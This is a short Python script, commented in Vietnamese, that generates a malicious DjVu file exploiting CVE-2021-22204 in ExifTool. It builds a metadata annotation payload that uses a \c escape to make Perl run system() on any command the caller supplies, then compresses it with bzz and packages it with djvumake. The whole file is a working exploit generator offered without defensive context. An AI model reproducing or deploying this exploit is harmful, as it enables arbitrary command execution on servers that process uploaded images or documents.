import subprocess
import tempfile
import os

def create_djvu_with_payload(command):
    """Tạo file DjVu exploit CVE-2021-22204"""
    
    # Payload injection - \c trigger perl code evaluation
    payload = f'(metadata "\\c${{system(\'{command}\')}}")'
    
    with tempfile.TemporaryDirectory() as tmpdir:
        payload_file = os.path.join(tmpdir, "payload.txt")
        bzz_file = os.path.join(tmpdir, "payload.bzz")
        djvu_file = os.path.join(tmpdir, "exploit.djvu")
        
        # Ghi payload vào file
        with open(payload_file, "w") as f:
            f.write(payload)
        
        # Nén với bzz (DjVu compression)
        subprocess.run(["bzz", payload_file, bzz_file], capture_output=True)
        
        # Tạo file DjVu với annotation chứa payload
        subprocess.run(
            ["djvumake", djvu_file, "INFO=100,100,100", f"ANTz={bzz_file}"],
            capture_output=True
        )
        
        with open(djvu_file, "rb") as f:
            return f.read()